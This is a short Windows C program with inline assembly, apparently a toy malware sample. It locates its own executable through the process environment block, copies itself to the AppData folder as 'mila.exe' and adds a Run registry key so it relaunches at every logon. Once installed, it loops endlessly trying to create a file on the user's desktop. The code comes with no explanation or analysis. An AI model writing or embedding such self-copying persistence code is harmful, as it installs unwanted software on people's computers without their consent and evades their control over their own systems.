#include <windows.h>

VOID WINAPI Entry(VOID) {
  PWSTR  szFullDllName;
  PWSTR  szOutputPath;
  HANDLE hProcessHeap;

  __asm {
    push ebx
    mov ebx, fs:[0x18]
    mov ebx, [ebx + 0x30]
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x28]

    mov [szFullDllName], ebx
    pop ebx
  };

  hProcessHeap = GetProcessHeap();

  if (!(szOutputPath = HeapAlloc(hProcessHeap, 0, MAX_PATH * sizeof(WCHAR)))) {
    return;
  }

  WCHAR szFilePart[] = L"\\mila.exe";
  ULONG dwOutputPathLenght = GetEnvironmentVariableW(L"APPDATA", szOutputPath, MAX_PATH);

  for (ULONG_PTR i = 0; i != ARRAYSIZE(szFilePart); i++) {
    szOutputPath[dwOutputPathLenght + i] = szFilePart[i];
  }

  for (ULONG_PTR i = 0; i != dwOutputPathLenght + ARRAYSIZE(szFilePart); i++) {
    WCHAR cChar1 = szFullDllName[i];
    WCHAR cChar2 = szOutputPath[i];

    if (cChar1 >= 'a' && cChar1 <= 'z') { cChar1 -= 0x20; }
    if (cChar2 >= 'a' && cChar2 <= 'z') { cChar2 -= 0x20; }

    if (cChar1 != cChar2) {
      goto LINSTALL;
    }
  }

  WCHAR szMilasFile[] = L"\\Desktop\\mila.txt";

  dwOutputPathLenght = GetEnvironmentVariableW(L"USERPROFILE", szOutputPath, MAX_PATH);

  for (ULONG_PTR i = 0; i != ARRAYSIZE(szMilasFile); i++) {
    szOutputPath[dwOutputPathLenght + i] = szMilasFile[i];
  }

  while (TRUE) {
    HANDLE hFile = CreateFileW(szOutputPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFile) {
      CloseHandle(hFile);
    }

    _mm_pause();
    _mm_pause();
    _mm_pause();
    _mm_pause();
  }

  return;

LINSTALL:
  dwOutputPathLenght += ARRAYSIZE(szFilePart);

  CopyFileW(szFullDllName, szOutputPath, FALSE);

  RegSetKeyValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"mila", REG_SZ, szOutputPath, (dwOutputPathLenght + 1) * sizeof(WCHAR));

  ExitProcess(0);
}
